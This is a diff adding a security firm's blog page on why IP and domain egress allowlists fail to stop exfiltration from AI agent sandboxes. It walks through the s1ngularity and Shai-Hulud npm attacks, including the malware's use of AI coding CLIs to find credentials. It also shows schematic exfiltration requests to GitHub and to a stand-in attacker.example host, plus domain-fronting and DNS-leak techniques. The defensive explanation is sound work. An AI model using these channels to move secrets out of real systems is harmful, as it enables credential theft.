@@ -1,0 +1,341 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Why L3 egress control is not enough | Bullfrog</title>
+  <meta name="description" content="IP and domain allowlists decide where traffic goes, not what it carries or which account receives it. Recent attacks exfiltrated through services everyone allows.">
+  
+  <link rel="canonical" href="https://bullfrogsec.com/blog/l3-egress-control-is-not-enough">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Bullfrog">
+  <meta property="og:title" content="Why L3 egress control is not enough">
+  <meta property="og:description" content="IP and domain allowlists decide where traffic goes, not what it carries or which account receives it. Recent attacks exfiltrated through services everyone allows.">
+  <meta property="og:url" content="https://bullfrogsec.com/blog/l3-egress-control-is-not-enough">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Why L3 egress control is not enough">
+  <meta name="twitter:description" content="IP and domain allowlists decide where traffic goes, not what it carries or which account receives it. Recent attacks exfiltrated through services everyone allows.">
+  
+  <meta property="article:published_time" content="2026-10-01">
+  <meta property="article:modified_time" content="2026-10-01">
+  <meta property="article:author" content="Mathieu Larose">
+  <meta name="author" content="Mathieu Larose">
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Why L3 egress control is not enough","description":"IP and domain allowlists decide where traffic goes, not what it carries or which account receives it. Recent attacks exfiltrated through services everyone allows.","datePublished":"2026-10-01","dateModified":"2026-10-01","author":{"@type":"Person","name":"Mathieu Larose","jobTitle":"CTO & Co-Founder","sameAs":["https://www.linkedin.com/in/mathieularose/"]},"publisher":{"@type":"Organization","name":"Bullfrog Security","url":"https://bullfrogsec.com","logo":"https://bullfrogsec.com/favicon.svg"},"mainEntityOfPage":"https://bullfrogsec.com/blog/l3-egress-control-is-not-enough","url":"https://bullfrogsec.com/blog/l3-egress-control-is-not-enough"}</script>
+  
+  <link rel="alternate" type="application/atom+xml" title="Bullfrog blog" href="/blog/feed.xml">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="preload" href="/assets/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="stylesheet" href="/assets/site.css?v=eff914a8fa79">
+  <link rel="stylesheet" href="/assets/blog/l3-egress-control-is-not-enough/style.css?v=96b1da5d77c6">
+  <meta name="bullfrog:chatwoot-token" content="VPFeLjmU4EQCkYs67xiRiqYG">
+  <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "e238e68d369b4d7fb4decccc0a80d1b6"}'></script>
+  <script src="/assets/site.js?v=1dfbfd0dc402" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header">
+  <nav class="wrap navigation" aria-label="Main navigation">
+    <a class="wordmark" href="/" aria-label="Bullfrog Security home"><img src="/assets/images/logo.svg?v=6d8b1fad2be3" width="29" height="29" alt=""><span>Bullfrog Security</span></a>
+    <div class="navigation-links">
+      <a href="/assessment">Assessment</a>
+      <a href="/training">Training</a>
+      <a href="/egress-control">Bullfrog Egress Control</a>
+      <a href="/blog" aria-current="true">Blog</a>
+      <a href="/team">The team</a>
+    </div>
+    <a class="cta navigation-cta" href="mailto:info@bullfrogsec.com">Get in touch</a>
+    <details class="mobile-menu">
+      <summary>Menu 
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m6 8 4 4 4-4"/>
+  
+</svg>
+</summary>
+      <div class="dropdown">
+        <a href="/assessment">Assessment</a>
+        <a href="/training">Training</a>
+        <a href="/egress-control">Bullfrog Egress Control</a>
+        <a href="/blog">Blog</a>
+        <a href="/team">The team</a>
+        <a href="mailto:info@bullfrogsec.com">Get in touch</a>
+      </div>
+    </details>
+  </nav>
+</header>
+
+  <main id="main" tabindex="-1">
+<article class="post wrap">
+  <header class="post-header">
+    <h1>Why L3 egress control is not enough</h1>
+    <p class="post-lead">IP and domain allowlists decide where traffic goes, not what it carries or which account receives it. Recent attacks exfiltrated through services everyone allows.</p>
+    <div class="byline">
+      <img src="/assets/images/mathieu.jpg" alt="" width="44" height="44">
+      <p>
+        <strong>Mathieu Larose</strong><span class="byline-role">, CTO &amp; Co-Founder</span><a class="linkedin" href="https://www.linkedin.com/in/mathieularose/" aria-label="Mathieu Larose on LinkedIn">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path fill="currentColor" stroke="none" transform="scale(.8333)" d="M20.45 20.45h-3.55v-5.57c0-1.33-.03-3.04-1.85-3.04-1.85 0-2.14 1.45-2.14 2.94v5.67H9.35V9h3.41v1.56h.05c.48-.9 1.64-1.85 3.37-1.85 3.6 0 4.27 2.37 4.27 5.46v6.28ZM5.34 7.43a2.06 2.06 0 1 1 0-4.13 2.06 2.06 0 0 1 0 4.13Zm1.78 13.02H3.56V9h3.56v11.45ZM22.22 0H1.77C.79 0 0 .77 0 1.73v20.54C0 23.23.79 24 1.77 24h20.45c.98 0 1.78-.77 1.78-1.73V1.73C24 .77 23.2 0 22.22 0Z"/>
+  
+</svg>
+</a><br>
+        <time datetime="2026-10-01">October 2026</time>
+      </p>
+    </div>
+  </header>
+  <div class="prose"><p>Most teams that put an AI agent in a sandbox reach for the same control first: an egress allowlist. It&#39;s a short list of the domains the agent may reach, such as <code>registry.npmjs.org</code> for packages, <code>api.anthropic.com</code> for the model and <code>github.com</code> for code. Everything else is blocked. It is cheap, it is well understood, and it stops the most naive exfiltration: an HTTP POST to an attacker&#39;s server.</p>
+<p>We&#39;ll call this L3 egress control, because it works at layer 3 of the network, the IP layer. It checks where a connection is going, by IP address and sometimes by port or domain name. It never looks at what the agent sends over that connection.</p>
+<p>Real attacks exploit exactly that blind spot: they send stolen data to a destination the allowlist already trusts. Below are three requests to GitHub. The first is ordinary work. The other two are how a malicious npm package, in August 2025, published secrets from developers&#39; machines. All three go to a destination every developer allowlist permits.</p>
+<figure class="post-figure figure-wide">
+
+<div class="fig">
+  <p class="fig-title">Three requests to <code>api.github.com:443</code></p>
+  <div class="connection-table" role="table" aria-label="Three requests to the same destination, judged by an IP or domain allowlist and by a request policy">
+    <div class="connection-row connection-head" role="row">
+      <span role="columnheader">Request</span>
+      <span role="columnheader">IP/domain allowlist</span>
+      <span role="columnheader">Request policy</span>
+    </div>
+    
+    <div class="connection-row" role="row">
+      <div class="connection-request" role="cell">
+        <strong>Read a file in your repository</strong>
+        <code><span class="connection-method">GET</span> /repos/<span class="fig-trusted">your-org</span>/app/contents/package.json</code>
+      </div>
+      <div role="cell"><span class="connection-label">Allowlist</span><span class="fig-pill fig-grey">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m5 10 3.3 3.4L15.5 6"/>
+  
+</svg>
+Allowed</span></div>
+      <div role="cell"><span class="connection-label">Request policy</span><span class="fig-pill fig-green">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m5 10 3.3 3.4L15.5 6"/>
+  
+</svg>
+Allowed</span></div>
+    </div>
+    
+    <div class="connection-row" role="row">
+      <div class="connection-request" role="cell">
+        <strong>Create a public repository</strong>
+        <code><span class="connection-method">POST</span> /user/repos <span class="fig-muted">{"name": "s1ngularity-repository", "private": false}</span></code>
+      </div>
+      <div role="cell"><span class="connection-label">Allowlist</span><span class="fig-pill fig-grey">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m5 10 3.3 3.4L15.5 6"/>
+  
+</svg>
+Allowed</span></div>
+      <div role="cell"><span class="connection-label">Request policy</span><span class="fig-pill fig-red">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m6 6 8 8M14 6l-8 8"/>
+  
+</svg>
+Blocked</span></div>
+    </div>
+    
+    <div class="connection-row" role="row">
+      <div class="connection-request" role="cell">
+        <strong>Commit the stolen secrets to it</strong>
+        <code><span class="connection-method">PUT</span> /repos/<span class="fig-attacker">victim</span>/s1ngularity-repository/contents/results.b64</code>
+      </div>
+      <div role="cell"><span class="connection-label">Allowlist</span><span class="fig-pill fig-grey">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m5 10 3.3 3.4L15.5 6"/>
+  
+</svg>
+Allowed</span></div>
+      <div role="cell"><span class="connection-label">Request policy</span><span class="fig-pill fig-red">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m6 6 8 8M14 6l-8 8"/>
+  
+</svg>
+Blocked</span></div>
+    </div>
+    
+  </div>
+</div>
+<figcaption>Requests from the s1ngularity attack, simplified. An allowlist sees one destination; a request policy judges each request.</figcaption></figure><p>To an allowlist, the three look identical: same destination, <code>api.github.com</code>, same port. The destination is all it sees, so it allows all three. Below, we walk through that attack, known as s1ngularity, and the two waves of the Shai-Hulud worm that came after it, to show why this blind spot matters.</p>
+<h2 id="what-an-l3-allowlist-sees-and-what-it-misses">What an L3 allowlist sees, and what it misses</h2>
+<p>An L3 rule sees the destination: an IP address and a port. Firewalls that accept domain names also see the hostname, either from the DNS answer or from the TLS Server Name Indication (SNI), the name the client announces when it opens an encrypted connection. That is all it has, so its decision can only be about <em>where</em> a connection goes.</p>
+<p>What it misses is everything that tells a legitimate request apart from an exfiltration:</p>
+<ul>
+<li>the HTTP method: reading a package or publishing one;</li>
+<li>the path: your organization&#39;s repository or someone else&#39;s;</li>
+<li>the account: your token or one the attacker planted;</li>
+<li>the body: an issue comment, a tool call argument, a file upload.</li>
+</ul>
+<p>An allowlist that permits <code>github.com</code> permits all of these equally.</p>
+<h2 id="same-service-different-account">Same service, different account</h2>
+<p>In August 2025, malicious versions of the Nx build system were published to npm. Their install script collected credentials, in part by asking the AI coding CLIs installed on the machine to look for them. It then created a <strong>public GitHub repository in the victim&#39;s own account</strong>, named <code>s1ngularity-repository</code>, and committed the stolen data to it, base64-encoded. The attacker only had to search GitHub for that name. <a href="https://www.wiz.io/blog/s1ngularitys-aftermath">Wiz counted</a> over 1,700 users whose secrets leaked this way in the first phase.</p>
+<p>A month later the <a href="https://unit42.paloaltonetworks.com/npm-supply-chain-attack/">Shai-Hulud npm worm</a> did the same thing, creating a public repository named <code>Shai-Hulud</code> with the victim&#39;s secrets. That first version also planted a GitHub Actions workflow that sent repository secrets to a <code>webhook.site</code> URL, the one destination in this story an allowlist would have blocked. The second wave, in November 2025, <a href="https://semgrep.dev/blog/2025/digging-for-secrets-sha1-hulud-the-second-coming-of-the-npm-worm/">dropped the external endpoint</a> and published secrets only to GitHub repositories, <a href="https://www.zscaler.com/blogs/security-research/shai-hulud-v2-poses-risk-npm-supply-chain">more than 27,000 of them</a>.</p>
+<figure class="post-figure figure-wide">
+
+<div class="fig">
+  <p class="fig-title">Where the stolen secrets went</p>
+  <ol class="campaigns">
+    
+    <li class="campaign">
+      <p class="campaign-date">August 2025</p>
+      <div class="fig-box">
+        <strong>s1ngularity</strong>
+        <span>Nx build system</span>
+        <ul class="campaign-destinations">
+          
+          <li>
+            <code>api.github.com</code>
+            <span class="fig-muted">A public repository in the victim’s own account</span>
+            <span class="fig-pill fig-red">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m5 10 3.3 3.4L15.5 6"/>
+  
+</svg>
+Passes an allowlist</span>
+          </li>
+          
+        </ul>
+      </div>
+    </li>
+    
+    <li class="campaign">
+      <p class="campaign-date">September 2025</p>
+      <div class="fig-box">
+        <strong>Shai-Hulud</strong>
+        <span>npm worm, first wave</span>
+        <ul class="campaign-destinations">
+          
+          <li>
+            <code>api.github.com</code>
+            <span class="fig-muted">A public repository named Shai-Hulud</span>
+            <span class="fig-pill fig-red">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m5 10 3.3 3.4L15.5 6"/>
+  
+</svg>
+Passes an allowlist</span>
+          </li>
+          
+          <li>
+            <code>webhook.site</code>
+            <span class="fig-muted">From a workflow planted in the victim’s repositories</span>
+            <span class="fig-pill fig-green">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m6 6 8 8M14 6l-8 8"/>
+  
+</svg>
+Stopped by an allowlist</span>
+          </li>
+          
+        </ul>
+      </div>
+    </li>
+    
+    <li class="campaign">
+      <p class="campaign-date">November 2025</p>
+      <div class="fig-box">
+        <strong>Sha1-Hulud: The Second Coming</strong>
+        <span>npm worm, second wave</span>
+        <ul class="campaign-destinations">
+          
+          <li>
+            <code>api.github.com</code>
+            <span class="fig-muted">Public repositories with random names, more than 27,000 in total</span>
+            <span class="fig-pill fig-red">
+<svg class="icon" viewBox="0 0 20 20" aria-hidden="true" focusable="false">
+  <path d="m5 10 3.3 3.4L15.5 6"/>
+  
+</svg>
+Passes an allowlist</span>
+          </li>
+          
+        </ul>
+      </div>
+    </li>
+    
+  </ol>
+</div>
+<figcaption>Three npm campaigns in 2025. One exfiltration path went somewhere an allowlist would block, and the campaign that used it also wrote to GitHub.</figcaption></figure><p>From the network&#39;s point of view, every one of those requests was an HTTPS connection to <code>api.github.com</code>, a destination a build machine or coding agent needs. No IP or domain rule could have told them apart from a normal <code>git push</code>. Only the requests themselves, as in the first figure, show the difference.</p>
+<p>The pattern is not specific to GitHub. Any service that lets the caller choose the account it writes to is an exfiltration channel once it is allowed:</p>
+<ul>
+<li>object storage, where the bucket name is in the request, not the hostname;</li>
+<li>model provider APIs, where a request made with an attacker&#39;s API key uploads files or prompts to the attacker&#39;s account;</li>
+<li>package registries, where publishing is a write to the same host you install from;</li>
+<li>Hugging Face, issue trackers and chat webhooks.</li>
+</ul>
+<p>The attackers moved to GitHub precisely because external endpoints are the part defenders block.</p>
+<h2 id="shared-infrastructure">Shared infrastructure</h2>
+<p>IP rules have a second problem: the IP is rarely yours or the service&#39;s alone. CDNs and cloud load balancers serve thousands of customers from the same addresses. Allowing the addresses behind one SaaS vendor often allows every other tenant on the same edge, including one an attacker can sign up for in a minute.</p>
+<p>Domain-based rules narrow this but do not close it. A filter that reads the SNI trusts a value the client chooses, and the HTTP <code>Host</code> header inside the encrypted connection can name a different site. Whether the edge routes on the inner name, the technique known as <a href="https://attack.mitre.org/techniques/T1090/004/">domain fronting</a>, depends on the CDN&#39;s own policy, not yours. Some reject the mismatch; you are relying on that.</p>
+<figure class="post-figure figure-wide"><div class="fig">
+  <p class="fig-title">One edge address, many tenants</p>
+  <div class="edge">
+    <div class="fig-box edge-request">
+      <strong>Agent’s request</strong>
+      <p class="edge-layer">Visible to the firewall</p>
+      <code>203.0.113.10:443</code>
+      <code>SNI <span class="fig-trusted">vendor.example</span></code>
+      <div class="edge-encrypted">
+        <p class="edge-layer">Encrypted</p>
+        <code>POST /upload</code>
+        <code>Host: <span class="fig-attacker">files.attacker.example</span></code>
+      </div>
+    </div>
+    <span class="fig-arrow" aria-hidden="true"></span>
+    <div class="fig-box edge-cdn">
+      <strong>CDN edge</strong>
+      <code>203.0.113.10</code>
+      <span>Routes on the name inside the request, unless the CDN rejects a mismatch</span>
+    </div>
+    <span class="fig-arrow fig-red" aria-hidden="true"></span>
+    <ul class="edge-tenants">
+      <li class="fig-box"><code>vendor.example</code><span>The service you allowed</span></li>
+      <li class="fig-box"><code>status.vendor.example</code><span>Same vendor, same edge</span></li>
+      <li class="fig-box fig-danger"><code>files.attacker.example</code><span>A free account on the same CDN, receives the upload</span></li>
+    </ul>
+  </div>
+</div>
+<figcaption>The firewall sees the address and the SNI. The name that decides where the request lands is inside the encryption. 203.0.113.0/24 is reserved for documentation (RFC 5737), the IP equivalent of example.com.</figcaption></figure><h2 id="the-allowed-request-is-the-channel">The allowed request is the channel</h2>
+<p>Even with perfectly scoped destinations, an allowed request can carry data out:</p>
+<ul>
+<li><strong>DNS.</strong> Most sandboxes must resolve names. A lookup for <code>&lt;encoded-secret&gt;.attacker.example</code> delivers the secret to the attacker&#39;s name server through the resolver you allowed. MITRE catalogues this as <a href="https://attack.mitre.org/techniques/T1071/004/">technique T1071.004</a>.</li>
+<li><strong>A read from a server the attacker controls.</strong> A <code>GET</code> can carry data in its path or query string. If the attacker owns something behind an allowed host, such as an S3 bucket behind an entry like <code>*.s3.amazonaws.com</code>, the bucket&#39;s access logs record every request, query string included. The secret arrives in a single request.</li>
+<li><strong>A read that bumps a counter.</strong> Here the attacker controls nothing on the server. The service keeps a public count for them: downloads of a release asset on GitHub or of a model on Hugging Face. Choosing which files to fetch, and how often, spells out the data a few bits at a time. It is slow, but a token is a few dozen bytes.</li>
+<li><strong>Remote MCP.</strong> Many tools share one HTTPS endpoint. Allowing the endpoint allows every tool, including the one that creates an issue in a repository of the caller&#39;s choosing.</li>
+</ul>
+<h2 id="what-request-level-control-adds">What request-level control adds</h2>
+<p>Closing these gaps means deciding on the request, not the connection. That requires seeing the plaintext HTTP request, which in turn requires being on the machine or terminating TLS, and it means writing policy in the service&#39;s own terms:</p>
+<ul>
+<li>allow <code>GET</code> on the package registry, block publishing;</li>
+<li>allow pushes to repositories under your organization, block repository creation and writes anywhere else;</li>
+<li>allow an MCP endpoint&#39;s read tools, block or restrict the tools that write;</li>
+<li>allow the model provider only with your organization&#39;s credentials.</li>
+</ul>
+<p>Request-level control has limits too. It covers the protocols and clients the enforcement point understands. It enforces the policy you configure; it does not know on its own which data is sensitive. A rule that allows writes to your organization still allows an agent to write whatever it holds into your organization&#39;s repositories.</p>
+<h2 id="keep-the-allowlist-and-add-a-layer">Keep the allowlist, and add a layer</h2>
+<p>None of this argues against L3 egress control. It is a cheap floor that removes the long tail of destinations and makes the remaining channels fewer and better known. But an allowlist answers &quot;where can this agent connect&quot;, and every attack in this post connected somewhere it allowed. The question that stops them is &quot;what is this request doing, and on whose behalf&quot;.</p>
+<p>That second question is what we built <a href="/egress-control">Bullfrog Egress Control</a> to answer.</p>
+</div>
+</article>
+</main>
+  <footer class="site-footer wrap">
+  <div class="footer-main">
+    <div>
+      <a class="wordmark" href="/" aria-label="Bullfrog Security home"><img src="/assets/images/logo.svg?v=6d8b1fad2be3" width="25" height="25" alt=""><span>Bullfrog Security</span></a>
+      <p>Security for AI agents.</p>
+      <p class="contact-line">Contact us at <a href="mailto:info@bullfrogsec.com">info@bullfrogsec.com</a></p>
+
+    </div>
+    <div><h2>Services</h2><a href="/assessment">Agent security assessment</a><a href="/training">Training</a></div>
+    <div><h2>Product</h2><a href="/egress-control">Bullfrog Egress Control</a></div>
+    <div><h2>Company</h2><a href="/team">The team</a><a href="/blog">Blog</a></div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2026 Bullfrog</span>
+    <div><a href="/privacy">Privacy</a><a href="/terms">Terms</a></div>
+  </div>
+  <noscript><p class="no-script-note">Chat is off without JavaScript. Contact <a href="mailto:info@bullfrogsec.com">info@bullfrogsec.com</a>.</p></noscript>
+</footer>
+
+  <button type="button" class="chat-launcher cta" data-chat hidden>Chat with us</button>
+</body>
+</html>
